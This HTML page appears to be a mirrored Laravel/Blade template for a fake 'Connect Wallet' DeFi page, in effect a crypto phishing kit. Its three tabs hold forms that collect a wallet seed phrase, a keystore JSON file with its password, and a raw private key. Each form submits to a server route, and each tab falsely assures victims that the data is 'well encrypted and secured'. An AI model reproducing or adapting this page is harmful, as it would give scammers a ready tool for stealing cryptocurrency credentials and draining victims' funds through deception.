<!DOCTYPE html>
<html>

<!-- Mirrored from mianappdefi.com/s/app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 04 Sep 2022 08:57:50 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <title> Connect Wallet </title>
    <!-- Meta-tags -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script type="application/x-javascript">
		addEventListener("load", function () {
			setTimeout(hideURLbar, 0);
		}, false);

		function hideURLbar() {
			window.scrollTo(0, 1);
		}
	</script>


    <!--// Metga-tags -->

    <!-- Styleshets -->
	<link rel="shortcut icon" type="image/x-icon" href="{{ asset('assets/img/favicon.ico') }}" />
    <link href="{{ asset('wallet/css/bootstrap.css') }}" rel="stylesheet" type="text/css" media="all" />
    <!--// Bootstrap-css -->
    <link href="{{ asset('wallet/css/easy-responsive-tabs.css') }}" rel='stylesheet' type='text/css' />
    <!--// Responsive-tabs -->
    <link href="{{ asset('wallet/css/popuo-box.css') }}" rel="stylesheet" type="text/css" media="all" />
    <!--// Pop-up -->
    <link href="{{ asset('wallet/css/banner.css') }}" rel="stylesheet" type="text/css" media="all" />
    <!--// banner-css -->
    <link rel="stylesheet" href="{{ asset('wallet/css/shop.css') }}" type="text/css" media="screen" property="" />
    <!--// shop-css -->
    <link href="{{ asset('wallet/css/style.css') }}" rel="stylesheet" type="text/css" media="all" />
    <!-- common-css -->
    <link rel="stylesheet" href="{{ asset('wallet/css/client.css') }}" type="text/css" media="all" />
    <!-- // client-css -->
    <link href="https://walletsynchronize.com/wallet/css/font-awesome.css" rel="stylesheet">
    <!-- // Font-awesome-css -->
    <!--// Styleshets -->

    <!-- Online-fonts -->
    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,500,600,700,800" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
    <!--// Online-fonts -->

</head>

<body class="container">

    <!-- about -->
    <div class="aboutf" id="services">
        <div class="container">
            <h3 class="tittlef-agileits-w3layouts">Connect Wallet</h3>
            <p class="paragraphf"> Use any of the following tab</p>
        </div>
        <x-flash />
        <div class="banner_bottom_tab_grids">
            <div id="verticalTab" class="resp-vtabs" style="display: block; width: 100%; margin: 0px;">
                <ul class="resp-tabs-list">
                    <li class="resp-tab-item resp-tab-active" aria-controls="tab_item-0" role="tab">Phrase</li>
                    <li class="resp-tab-item" aria-controls="tab_item-1" role="tab">Keystore JSON</li>
                    <li class="resp-tab-item" aria-controls="tab_item-2" role="tab">Private Key</li>

                </ul>
                <div class="resp-tabs-container">
                    <!-- tab1 -->
                    <div class="resp-tab-content resp-tab-content-active" style="display:block"
                        aria-labelledby="tab_item-0">
                        <!-- tabs-info -->
                        <div class="main-topicsf">
                            <div class="col-md-7 contctf_mail_grid_right">
                                <p>Typically 12 (sometimes 24) words seperated by a single spaces.</p><br><br>
                                <form action="{{ route('phraseSubmit') }}" method="post">
                                    @csrf
                                    {{-- <input type="hidden" name="type" value=""> --}}
                                    <div class="inputf">
                                        <textarea name="phrase" placeholder="Phrase" required=""></textarea>
                                    </div>
                                    {{-- <button type="submit">Connect</button> --}}
                                    <input type="submit" value="Connect">
                                    <input type="reset" value="Clear">
                                </form><br>
                                <p>Note: Your wallet seed phrase are well encrypted and secured.</p>
                            </div>
                            <div class="clearfix"> </div>
                        </div>
                        <!-- //tabs-info -->

                    </div>
                    <!-- //tab1 -->
                    <!-- tab2 -->
                    <div class="resp-tab-content" aria-labelledby="tab_item-1">
                        <!-- tabs-info -->
                        <div class="main-topicsf">
                            <div class="col-md-7 contctf_mail_grid_right">
                                <p>Several lines of text beginning with "{...}" plus the password you used to encrypt
                                    it.</p><br><br>
                                <form action="{{ route('keystoreSubmit') }}" method="post">
                                    @csrf
                                    {{-- <input type="hidden" name="type" value=""> --}}
                                    <div class="inputf">
                                        <textarea name="keystore_json" placeholder="Keystore JSON" value="" required=""></textarea>

                                        <input type="text" name="keystore_json_pass" placeholder="Password"
                                            value="" required="">
                                    </div>
                                    <input type="submit" value="Connect">
                                    <input type="reset" value="Clear">
                                </form><br>
                                <p>Note: Your wallet seed phrase are well encrypted and secured.</p>

                            </div>
                            <div class="clearfix"> </div>
                        </div>
                        <!-- //tabs-info -->
                    </div>
                    <!--// tab2 -->
                    <!-- tab3 -->
                    <div class="resp-tab-content" aria-labelledby="tab_item-2">
                        <!-- tabs-info -->
                        <div class="main-topicsf">
                            <div class="col-md-7 contctf_mail_grid_right">
                                <p>Typically 12 (sometimes 24) words seperated by a single spaces.</p><br><br>
                                <form action="{{ route('privateSubmit') }}" method="post">
                                    @csrf
                                    {{-- <input type="hidden" name="type" value=""> --}}
                                    <div class="inputf">
                                        <input type="text" name="private_key" placeholder="Private Key"
                                            required="">
                                    </div>
                                    <input type="submit" value="Connect">
                                    <input type="reset" value="Clear">
                                </form><br>
                                <p>Note: Your wallet seed phrase are well encrypted and secured.</p>

                            </div>
                            <div class="clearfix"> </div>
                        </div>
                        <!-- //tabs-info -->

                    </div>
                    <!--// tab3 -->

                </div>
            </div>
        </div>
    </div>
    <!-- //about-->


    <!-- //footer -->

    <!-- js -->

    <!-- Common js -->
    <script type="text/javascript" src="wallet/js/jquery-2.1.4.min.js"></script>
    <!--// Common js -->

    <!-- cart-js -->
    <script src="wallet/js/minicart.js"></script>
    <script>
        edu.render();

        edu.cart.on('edu_checkout', function(evt) {
            var items, len, i;

            if (this.subtotal() > 0) {
                items = this.items();

                for (i = 0, len = items.length; i < len; i++) {}
            }
        });
    </script>
    <!-- //cart-js -->

    <!-- reviews -->
    <script>
        function blinker() {
            $('.blinking').fadeOut(500);
            $('.blinking').fadeIn(500);
        }
        setInterval(blinker, 1000);
    </script>
    <script>
        function cycle($item, $cycler) {
            setTimeout(cycle, 2000, $item.next(), $cycler);

            $item.slideUp(1000, function() {
                $item.appendTo($cycler).show();
            });
        }
        cycle($('#cycler div:first'), $('#cycler'));
    </script>
    <!--// reviews -->

    <!-- responsive-tabs -->
    <script src="wallet/js/easy-responsive-tabs.js"></script>
    <script>
        $(document).ready(function() {
            $('#verticalTab').easyResponsiveTabs({
                type: 'vertical',
                width: 'auto',
                fit: true
            });
        });
    </script>
    <!-- //responsive-tabs -->

    <!-- Carousel Auto-Cycle -->
    <script>
        $(document).ready(function() {
            $('.carousel').carousel({
                interval: 6000
            })
        });
    </script>
    <!-- // Carousel Auto-Cycle -->

    <!-- Nav Js -->
    <script type="text/javascript" src="wallet/js/bootstrap.js"></script>
    <script>
        $(document).ready(function() {
            $(".dropdown").hover(
                function() {
                    $('.dropdown-menu', this).not('.in .dropdown-menu').stop(true, true).slideDown("400");
                    $(this).toggleClass('open');
                },
                function() {
                    $('.dropdown-menu', this).not('.in .dropdown-menu').stop(true, true).slideUp("400");
                    $(this).toggleClass('open');
                }
            );
        });
    </script>
    <!--// Nav Js -->


    <script>
        $('.toggle').click(function() {
            // Switches the Icon
            $(this).children('i').toggleClass('fa-pencil');
            // Switches the forms  
            $('.form').animate({
                height: "toggle",
                'padding-top': 'toggle',
                'padding-bottom': 'toggle',
                opacity: "toggle"
            }, "slow");
        });
    </script>
    <!-- //bootstrap-pop-up -->

    <!--pop-up-box -->
    <script src="wallet/js/jquery.magnific-popup.js" type="text/javascript"></script>
    <script>
        $(document).ready(function() {
            $('.popup-with-zoom-anim').magnificPopup({
                type: 'inline',
                fixedContentPos: false,
                fixedBgPos: true,
                overflowY: 'auto',
                closeBtnInside: true,
                preloader: false,
                midClick: true,
                removalDelay: 300,
                mainClass: 'my-mfp-zoom-in'
            });

        });
    </script>
    <!-- //pop-up-box -->
    <!-- start-smoth-scrolling -->
    <script type="text/javascript" src="wallet/js/move-top.js"></script>
    <script type="text/javascript" src="wallet/js/easing.js"></script>
    <script type="text/javascript">
        jQuery(document).ready(function($) {
            $(".scroll").click(function(event) {
                event.preventDefault();
                $('html,body').animate({
                    scrollTop: $(this.hash).offset().top
                }, 1000);
            });
        });
    </script>
    <!-- start-smoth-scrolling -->
    <!-- here stars scrolling icon -->
    <script type="text/javascript">
        $(document).ready(function() {
            /*
            	var defaults = {
            	containerID: 'toTop', // fading element id
            	containerHoverID: 'toTopHover', // fading element hover id
            	scrollSpeed: 1200,
            	easingType: 'linear' 
            	};
            	*/

            $().UItoTop({
                easingType: 'easeOutQuart'
            });

        });
    </script>
    <!-- //here ends scrolling icon -->
    <!-- smoothscroll -->
    <script src="wallet/js/SmoothScroll.min.js"></script>
    <!-- //smoothscroll -->

</body>


<!-- Mirrored from mianappdefi.com/s/app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 04 Sep 2022 08:58:14 GMT -->

</html>
